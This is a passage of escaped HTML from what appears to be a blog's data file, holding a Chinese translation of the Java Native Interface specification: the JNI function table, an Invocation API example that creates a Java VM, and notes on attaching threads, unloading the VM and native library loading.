class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">JNINativeInterface</span> *<span class=\"title\">JNIEnv</span>;</span> </span><br></pre></td></tr></table></figure>\n\n<p>VM初始化函数表。注意，前三个条目是为了将来与COM兼容而保留的。此外，我们在函数表的开始处保留了许多额外的空条目，以便将来与类相关的JNI操作可以添加在FindClass之后，而不是在表的末尾。</p>\n<p>注意，函数表可以在所有JNI接口指针之间共享。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">JNINativeInterface</span> ... =</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">    <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">    <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">    <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">    GetVersion,</span><br><span class=\"line\"></span><br><span class=\"line\">    DefineClass,</span><br><span class=\"line\">    FindClass,</span><br><span class=\"line\"></span><br><span class=\"line\">    FromReflectedMethod,</span><br><span class=\"line\">    FromReflectedField,</span><br><span class=\"line\">    ToReflectedMethod,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetSuperclass,</span><br><span class=\"line\">    IsAssignableFrom,</span><br><span class=\"line\"></span><br><span class=\"line\">    ToReflectedField,</span><br><span class=\"line\"></span><br><span class=\"line\">    Throw,</span><br><span class=\"line\">    ThrowNew,</span><br><span class=\"line\">    ExceptionOccurred,</span><br><span class=\"line\">    ExceptionDescribe,</span><br><span class=\"line\">    ExceptionClear,</span><br><span class=\"line\">    FatalError,</span><br><span class=\"line\"></span><br><span class=\"line\">    PushLocalFrame,</span><br><span class=\"line\">    PopLocalFrame,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewGlobalRef,</span><br><span class=\"line\">    DeleteGlobalRef,</span><br><span class=\"line\">    DeleteLocalRef,</span><br><span class=\"line\">    IsSameObject,</span><br><span class=\"line\">    NewLocalRef,</span><br><span class=\"line\">    EnsureLocalCapacity,</span><br><span class=\"line\"></span><br><span class=\"line\">    AllocObject,</span><br><span class=\"line\">    NewObject,</span><br><span class=\"line\">    NewObjectV,</span><br><span class=\"line\">    NewObjectA,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetObjectClass,</span><br><span class=\"line\">    IsInstanceOf,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetMethodID,</span><br><span class=\"line\"></span><br><span class=\"line\">    CallObjectMethod,</span><br><span class=\"line\">    CallObjectMethodV,</span><br><span class=\"line\">    CallObjectMethodA,</span><br><span class=\"line\">    CallBooleanMethod,</span><br><span class=\"line\">    CallBooleanMethodV,</span><br><span class=\"line\">    CallBooleanMethodA,</span><br><span class=\"line\">    CallByteMethod,</span><br><span class=\"line\">    CallByteMethodV,</span><br><span class=\"line\">    CallByteMethodA,</span><br><span class=\"line\">    CallCharMethod,</span><br><span class=\"line\">    CallCharMethodV,</span><br><span class=\"line\">    CallCharMethodA,</span><br><span class=\"line\">    CallShortMethod,</span><br><span class=\"line\">    CallShortMethodV,</span><br><span class=\"line\">    CallShortMethodA,</span><br><span class=\"line\">    CallIntMethod,</span><br><span class=\"line\">    CallIntMethodV,</span><br><span class=\"line\">    CallIntMethodA,</span><br><span class=\"line\">    CallLongMethod,</span><br><span class=\"line\">    CallLongMethodV,</span><br><span class=\"line\">    CallLongMethodA,</span><br><span class=\"line\">    CallFloatMethod,</span><br><span class=\"line\">    CallFloatMethodV,</span><br><span class=\"line\">    CallFloatMethodA,</span><br><span class=\"line\">    CallDoubleMethod,</span><br><span class=\"line\">    CallDoubleMethodV,</span><br><span class=\"line\">    CallDoubleMethodA,</span><br><span class=\"line\">    CallVoidMethod,</span><br><span class=\"line\">    CallVoidMethodV,</span><br><span class=\"line\">    CallVoidMethodA,</span><br><span class=\"line\"></span><br><span class=\"line\">    CallNonvirtualObjectMethod,</span><br><span class=\"line\">    CallNonvirtualObjectMethodV,</span><br><span class=\"line\">    CallNonvirtualObjectMethodA,</span><br><span class=\"line\">    CallNonvirtualBooleanMethod,</span><br><span class=\"line\">    CallNonvirtualBooleanMethodV,</span><br><span class=\"line\">    CallNonvirtualBooleanMethodA,</span><br><span class=\"line\">    CallNonvirtualByteMethod,</span><br><span class=\"line\">    CallNonvirtualByteMethodV,</span><br><span class=\"line\">    CallNonvirtualByteMethodA,</span><br><span class=\"line\">    CallNonvirtualCharMethod,</span><br><span class=\"line\">    CallNonvirtualCharMethodV,</span><br><span class=\"line\">    CallNonvirtualCharMethodA,</span><br><span class=\"line\">    CallNonvirtualShortMethod,</span><br><span class=\"line\">    CallNonvirtualShortMethodV,</span><br><span class=\"line\">    CallNonvirtualShortMethodA,</span><br><span class=\"line\">    CallNonvirtualIntMethod,</span><br><span class=\"line\">    CallNonvirtualIntMethodV,</span><br><span class=\"line\">    CallNonvirtualIntMethodA,</span><br><span class=\"line\">    CallNonvirtualLongMethod,</span><br><span class=\"line\">    CallNonvirtualLongMethodV,</span><br><span class=\"line\">    CallNonvirtualLongMethodA,</span><br><span class=\"line\">    CallNonvirtualFloatMethod,</span><br><span class=\"line\">    CallNonvirtualFloatMethodV,</span><br><span class=\"line\">    CallNonvirtualFloatMethodA,</span><br><span class=\"line\">    CallNonvirtualDoubleMethod,</span><br><span class=\"line\">    CallNonvirtualDoubleMethodV,</span><br><span class=\"line\">    CallNonvirtualDoubleMethodA,</span><br><span class=\"line\">    CallNonvirtualVoidMethod,</span><br><span class=\"line\">    CallNonvirtualVoidMethodV,</span><br><span class=\"line\">    CallNonvirtualVoidMethodA,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetFieldID,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetObjectField,</span><br><span class=\"line\">    GetBooleanField,</span><br><span class=\"line\">    GetByteField,</span><br><span class=\"line\">    GetCharField,</span><br><span class=\"line\">    GetShortField,</span><br><span class=\"line\">    GetIntField,</span><br><span class=\"line\">    GetLongField,</span><br><span class=\"line\">    GetFloatField,</span><br><span class=\"line\">    GetDoubleField,</span><br><span class=\"line\">    SetObjectField,</span><br><span class=\"line\">    SetBooleanField,</span><br><span class=\"line\">    SetByteField,</span><br><span class=\"line\">    SetCharField,</span><br><span class=\"line\">    SetShortField,</span><br><span class=\"line\">    SetIntField,</span><br><span class=\"line\">    SetLongField,</span><br><span class=\"line\">    SetFloatField,</span><br><span class=\"line\">    SetDoubleField,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetStaticMethodID,</span><br><span class=\"line\"></span><br><span class=\"line\">    CallStaticObjectMethod,</span><br><span class=\"line\">    CallStaticObjectMethodV,</span><br><span class=\"line\">    CallStaticObjectMethodA,</span><br><span class=\"line\">    CallStaticBooleanMethod,</span><br><span class=\"line\">    CallStaticBooleanMethodV,</span><br><span class=\"line\">    CallStaticBooleanMethodA,</span><br><span class=\"line\">    CallStaticByteMethod,</span><br><span class=\"line\">    CallStaticByteMethodV,</span><br><span class=\"line\">    CallStaticByteMethodA,</span><br><span class=\"line\">    CallStaticCharMethod,</span><br><span class=\"line\">    CallStaticCharMethodV,</span><br><span class=\"line\">    CallStaticCharMethodA,</span><br><span class=\"line\">    CallStaticShortMethod,</span><br><span class=\"line\">    CallStaticShortMethodV,</span><br><span class=\"line\">    CallStaticShortMethodA,</span><br><span class=\"line\">    CallStaticIntMethod,</span><br><span class=\"line\">    CallStaticIntMethodV,</span><br><span class=\"line\">    CallStaticIntMethodA,</span><br><span class=\"line\">    CallStaticLongMethod,</span><br><span class=\"line\">    CallStaticLongMethodV,</span><br><span class=\"line\">    CallStaticLongMethodA,</span><br><span class=\"line\">    CallStaticFloatMethod,</span><br><span class=\"line\">    CallStaticFloatMethodV,</span><br><span class=\"line\">    CallStaticFloatMethodA,</span><br><span class=\"line\">    CallStaticDoubleMethod,</span><br><span class=\"line\">    CallStaticDoubleMethodV,</span><br><span class=\"line\">    CallStaticDoubleMethodA,</span><br><span class=\"line\">    CallStaticVoidMethod,</span><br><span class=\"line\">    CallStaticVoidMethodV,</span><br><span class=\"line\">    CallStaticVoidMethodA,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetStaticFieldID,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetStaticObjectField,</span><br><span class=\"line\">    GetStaticBooleanField,</span><br><span class=\"line\">    GetStaticByteField,</span><br><span class=\"line\">    GetStaticCharField,</span><br><span class=\"line\">    GetStaticShortField,</span><br><span class=\"line\">    GetStaticIntField,</span><br><span class=\"line\">    GetStaticLongField,</span><br><span class=\"line\">    GetStaticFloatField,</span><br><span class=\"line\">    GetStaticDoubleField,</span><br><span class=\"line\"></span><br><span class=\"line\">    SetStaticObjectField,</span><br><span class=\"line\">    SetStaticBooleanField,</span><br><span class=\"line\">    SetStaticByteField,</span><br><span class=\"line\">    SetStaticCharField,</span><br><span class=\"line\">    SetStaticShortField,</span><br><span class=\"line\">    SetStaticIntField,</span><br><span class=\"line\">    SetStaticLongField,</span><br><span class=\"line\">    SetStaticFloatField,</span><br><span class=\"line\">    SetStaticDoubleField,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewString,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetStringLength,</span><br><span class=\"line\">    GetStringChars,</span><br><span class=\"line\">    ReleaseStringChars,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewStringUTF,</span><br><span class=\"line\">    GetStringUTFLength,</span><br><span class=\"line\">    GetStringUTFChars,</span><br><span class=\"line\">    ReleaseStringUTFChars,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetArrayLength,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewObjectArray,</span><br><span class=\"line\">    GetObjectArrayElement,</span><br><span class=\"line\">    SetObjectArrayElement,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewBooleanArray,</span><br><span class=\"line\">    NewByteArray,</span><br><span class=\"line\">    NewCharArray,</span><br><span class=\"line\">    NewShortArray,</span><br><span class=\"line\">    NewIntArray,</span><br><span class=\"line\">    NewLongArray,</span><br><span class=\"line\">    NewFloatArray,</span><br><span class=\"line\">    NewDoubleArray,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetBooleanArrayElements,</span><br><span class=\"line\">    GetByteArrayElements,</span><br><span class=\"line\">    GetCharArrayElements,</span><br><span class=\"line\">    GetShortArrayElements,</span><br><span class=\"line\">    GetIntArrayElements,</span><br><span class=\"line\">    GetLongArrayElements,</span><br><span class=\"line\">    GetFloatArrayElements,</span><br><span class=\"line\">    GetDoubleArrayElements,</span><br><span class=\"line\"></span><br><span class=\"line\">    ReleaseBooleanArrayElements,</span><br><span class=\"line\">    ReleaseByteArrayElements,</span><br><span class=\"line\">    ReleaseCharArrayElements,</span><br><span class=\"line\">    ReleaseShortArrayElements,</span><br><span class=\"line\">    ReleaseIntArrayElements,</span><br><span class=\"line\">    ReleaseLongArrayElements,</span><br><span class=\"line\">    ReleaseFloatArrayElements,</span><br><span class=\"line\">    ReleaseDoubleArrayElements,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetBooleanArrayRegion,</span><br><span class=\"line\">    GetByteArrayRegion,</span><br><span class=\"line\">    GetCharArrayRegion,</span><br><span class=\"line\">    GetShortArrayRegion,</span><br><span class=\"line\">    GetIntArrayRegion,</span><br><span class=\"line\">    GetLongArrayRegion,</span><br><span class=\"line\">    GetFloatArrayRegion,</span><br><span class=\"line\">    GetDoubleArrayRegion,</span><br><span class=\"line\">    SetBooleanArrayRegion,</span><br><span class=\"line\">    SetByteArrayRegion,</span><br><span class=\"line\">    SetCharArrayRegion,</span><br><span class=\"line\">    SetShortArrayRegion,</span><br><span class=\"line\">    SetIntArrayRegion,</span><br><span class=\"line\">    SetLongArrayRegion,</span><br><span class=\"line\">    SetFloatArrayRegion,</span><br><span class=\"line\">    SetDoubleArrayRegion,</span><br><span class=\"line\"></span><br><span class=\"line\">    RegisterNatives,</span><br><span class=\"line\">    UnregisterNatives,</span><br><span class=\"line\"></span><br><span class=\"line\">    MonitorEnter,</span><br><span class=\"line\">    MonitorExit,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetJavaVM,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetStringRegion,</span><br><span class=\"line\">    GetStringUTFRegion,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetPrimitiveArrayCritical,</span><br><span class=\"line\">    ReleasePrimitiveArrayCritical,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetStringCritical,</span><br><span class=\"line\">    ReleaseStringCritical,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewWeakGlobalRef,</span><br><span class=\"line\">    DeleteWeakGlobalRef,</span><br><span class=\"line\"></span><br><span class=\"line\">    ExceptionCheck,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewDirectByteBuffer,</span><br><span class=\"line\">    GetDirectBufferAddress,</span><br><span class=\"line\">    GetDirectBufferCapacity,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetObjectRefType</span><br><span class=\"line\">  &#125;;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"第五章\"><a href=\"#第五章\" class=\"headerlink\" title=\"第五章\"></a>第五章</h2><p>Invocation API允许软件开发商将Java VM加载到任意的原生应用程序中。开发商可以在不链接Java VM源代码的情况下交付支持Java的应用程序。</p>\n<h3 id=\"介绍-1\"><a href=\"#介绍-1\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>下面的代码示例演示了如何在Invocation API中使用函数。在这个例子中，C++代码创建了一个Java VM并调用名为Main.test的静态方法。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;jni.h&gt;</span>       <span class=\"comment\">/* where everything is defined */</span></span></span><br><span class=\"line\">...</span><br><span class=\"line\">JavaVM *jvm;       <span class=\"comment\">/* denotes a Java VM */</span></span><br><span class=\"line\">JNIEnv *env;       <span class=\"comment\">/* pointer to native method interface */</span></span><br><span class=\"line\">JavaVMInitArgs vm_args; <span class=\"comment\">/* JDK/JRE 6 VM initialization arguments */</span></span><br><span class=\"line\">JavaVMOption* options = new JavaVMOption[<span class=\"number\">1</span>];</span><br><span class=\"line\">options[<span class=\"number\">0</span>].optionString = <span class=\"string\">&quot;-Djava.class.path=/usr/lib/java&quot;</span>;</span><br><span class=\"line\">vm_args.version = JNI_VERSION_1_6;</span><br><span class=\"line\">vm_args.nOptions = <span class=\"number\">1</span>;</span><br><span class=\"line\">vm_args.options = options;</span><br><span class=\"line\">vm_args.ignoreUnrecognized = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"comment\">/* load and initialize a Java VM, return a JNI interface</span></span><br><span class=\"line\"><span class=\"comment\"> * pointer in env */</span></span><br><span class=\"line\">JNI_CreateJavaVM(&amp;jvm, (<span class=\"type\">void</span>**)&amp;env, &amp;vm_args);</span><br><span class=\"line\">delete options;</span><br><span class=\"line\"><span class=\"comment\">/* invoke the Main.test method using the JNI */</span></span><br><span class=\"line\">jclass cls = env-&gt;FindClass(<span class=\"string\">&quot;Main&quot;</span>);</span><br><span class=\"line\">jmethodID mid = env-&gt;GetStaticMethodID(cls, <span class=\"string\">&quot;test&quot;</span>, <span class=\"string\">&quot;(I)V&quot;</span>);</span><br><span class=\"line\">env-&gt;CallStaticVoidMethod(cls, mid, <span class=\"number\">100</span>);</span><br><span class=\"line\"><span class=\"comment\">/* We are done. */</span></span><br><span class=\"line\">jvm-&gt;DestroyJavaVM();</span><br></pre></td></tr></table></figure>\n\n<p>这个例子使用了API中的三个函数。Invocation API允许原生应用程序使用JNI接口指针访问VM特性。</p>\n<h3 id=\"创建VM\"><a href=\"#创建VM\" class=\"headerlink\" title=\"创建VM\"></a>创建VM</h3><p>JNI_CreateJavaVM函数加载并初始化一个Java VM，并返回一个指向JNI接口指针的指针。调用JNI_CreateJavaVM函数的线程被作为主线程。</p>\n<h3 id=\"绑定VM\"><a href=\"#绑定VM\" class=\"headerlink\" title=\"绑定VM\"></a>绑定VM</h3><p>JNI接口指针JNIEnv仅在当前线程有效。如果另一个线程需要访问Java VM，它必须先调用AttachCurrentThread将自己绑定到VM，并获得JNI接口指针。一旦绑定到VM，原生线程就像运行在原生方法内部的普通Java线程一样工作。原生线程保持与VM绑定，直到调用DetachCurrentThread来解绑自己。</p>\n<p>绑定线程应该有足够的堆栈空间来执行一定数量的工作。每个线程的堆栈空间分配特定于操作系统。</p>\n<h3 id=\"解绑VM\"><a href=\"#解绑VM\" class=\"headerlink\" title=\"解绑VM\"></a>解绑VM</h3><p>绑定到VM的原生线程在退出之前必须调用DetachCurrentThread来解绑自己。如果调用堆栈上有Java方法，线程不能解绑自己。</p>\n<h3 id=\"卸载VM\"><a href=\"#卸载VM\" class=\"headerlink\" title=\"卸载VM\"></a>卸载VM</h3><p>JNI_DestroyJavaVM函数卸载一个Java VM。从JDK/JRE1.1开始，只有主线程可以通过调用DestroyJavaVM卸载VM。从JDK/JRE1.2开始限制被取消，任何线程都可以调用DestroyJavaVM卸载VM。</p>\n<p>VM等待直到当前线程成为唯一的非守护用户线程才真正卸载。用户线程包括Java线程和绑定的原生线程。存在此限制是因为Java线程或绑定的原生线程可能持有系统资源，比如锁、窗口等。VM不能自动释放这些资源。通过将当前线程限制为卸载VM时唯一运行的线程，程序员将承担释放任意线程占用系统资源的责任。</p>\n<h3 id=\"库和版本管理\"><a href=\"#库和版本管理\" class=\"headerlink\" title=\"库和版本管理\"></a>库和版本管理</h3><p>从JDK/JRE 1.1开始，一旦原生库被加载，它在所有类加载器中都是可见的。因此不同类加载器中的两个类可能链接同一个原生方法。这导致两个问题:</p>\n<ul>\n<li>一个类可能错误地链接到在不同类加载器中被同名类载入的原生库</li>\n<li>原生方法可以很容易的混合来自不同类加载器的类。这打破了类加载器提供的名称空间隔离，并导致类型安全问题</li>\n</ul>\n<p>从JDK/JRE 1.2开始，每个类加载器管理自己的一组原生库。同一个JNI原生库不能被载入到多个类加载器中。这样做会导致抛出UnsatisfiedLinkError。比如，System.loadLibrary在将一个原生库载入两个类加载时会抛出UnsatisfiedLinkError。新方法的好处是:</p>\n<ul>\n<li>基于类加载器的名称空间隔离被保留在原生库中。原生库不能很容易的混合来自不同类加载器的类</li>\n<li>此外，当对应的类加载器被垃圾回收时，原生库可以被卸载</li>\n</ul>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<h2 id=\"第一章\"><a href=\"#第一章\" class=\"headerlink\" title=\"第一章\"></a>第一章</h2><h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>JNI是原生程序接口。它允许运行在虚拟机内部的Java代码与使用C,C++或者汇编语言编写的应用程序和库进行交互。</p>\n<p>JNI不会对底层Java VM的实现产生任何限制。Java VM制造商能够支持JNI而不对VM的其他部分产生任何影响。程序员可以编写原生应用程序或库的一个版本，并且希望它能够和所有支持JNI的Java VM一起工作。</p>\n<h3 id=\"JNI预览\"><a href=\"#JNI预览\" class=\"headerlink\" title=\"JNI预览\"></a>JNI预览</h3><p>通过JNI编程，你能够使用原生方法创建、检查和更新Java对象，调用Java方法，捕获和抛出异常，加载类并且获取类信息，执行运行时类型检查。</p>\n<p>你可以使用JNI的Invocation API将任意的原生应用程序嵌入Java VM。这使得程序员很容易为现有的应用程序支持Java而并不需要链接VM源代码。</p>\n<h2 id=\"第二章\"><a href=\"#第二章\" class=\"headerlink\" title=\"第二章\"></a>第二章</h2><h3 id=\"JNI接口函数和指针\"><a href=\"#JNI接口函数和指针\" class=\"headerlink\" title=\"JNI接口函数和指针\"></a>JNI接口函数和指针</h3><p>原生代码通过调用JNI函数来访问Java VM功能。通过接口指针来访问JNI函数。接口指针是指向指针的指针。这个指针指向一个指针数组，其中每个都指向一个接口函数。每个接口函数都位于数组中预定义的偏移位置。</p>\n<p><img src=\"./images/designa.gif\"></p>\n<p>JNI接口指针仅在当前线程中可用。因此，原生方法不能将接口指针从一个线程传递到另一个线程。实现JNI的VM可以在JNI接口指针指向的区域中分配和存储线程本地数据。</p>\n<p>原生方法接收JNI接口指针作为参数。当从相同的Java线程中多次调用原生方法时，VM保证对原生方法传递相同的接口指针。然而一个原生方法能够从不同的Java线程中被调用，因此可能接收不同的JNI接口指针。</p>\n<h3 id=\"编译、加载和链接原生方法\"><a href=\"#编译、加载和链接原生方法\" class=\"headerlink\" title=\"编译、加载和链接原生方法\"></a>编译、加载和链接原生方法</h3><p>使用System.loadLibrary方法来加载原生方法。下面的例子中，类初始化方法加载了一个特定平台的原生库，其中定义了原生方法f</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> pkg;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Cls</span> &#123; </span><br><span 